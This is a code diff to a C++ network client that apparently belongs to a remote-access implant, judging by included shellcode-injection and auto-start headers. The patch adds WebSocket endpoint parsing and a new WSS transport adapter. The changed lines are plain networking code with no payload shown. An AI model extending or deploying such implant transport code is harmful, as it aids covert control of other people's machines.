@@ -16,8 +16,28 @@
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
 #include "WSSClient.h"
+#include "transport/ws_client.h"
 #include "auto_start.h"
 #include "ShellcodeInj.h"
+
+namespace {
+struct WssEndpointParts {
+    std::string host;
+    std::wstring path;
+};
+
+WssEndpointParts ResolveWssEndpoint(CONNECT_ADDRESS* conn)
+{
+    auto endpoint = ParseWssEndpoint(conn ? conn->ServerIP() : nullptr);
+    if (endpoint.host.empty() && conn) {
+        endpoint.host = conn->ServerIP();
+    }
+    if (endpoint.path.empty()) {
+        endpoint.path = std::wstring(L"/");
+    }
+    return { endpoint.host, endpoint.path };
+}
+}
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
@@ -32,8 +52,13 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string&
         return new IOCPUDPClient(bExit, exit_while_disconnect);
     if (type == PROTO_HTTP || type == PROTO_HTTPS)
         return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType(), publicIP);
-    if (type == PROTO_WSS)
-        return new WSSClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType(), publicIP);
+    if (type == PROTO_WSS) {
+        auto endpoint = ResolveWssEndpoint(conn);
+        auto client = new WebSocketTransportAdapter(bExit, exit_while_disconnect, MaskTypeNone,
+                                                    conn->GetHeaderEncType(), publicIP, endpoint.path);
+        client->SetServerAddress(endpoint.host.c_str(), conn->ServerPort());
+        return client;
+    }
     if (type == PROTO_KCP && !tcpOnly) {
         return new IOCPKCPClient(bExit, exit_while_disconnect);
     }
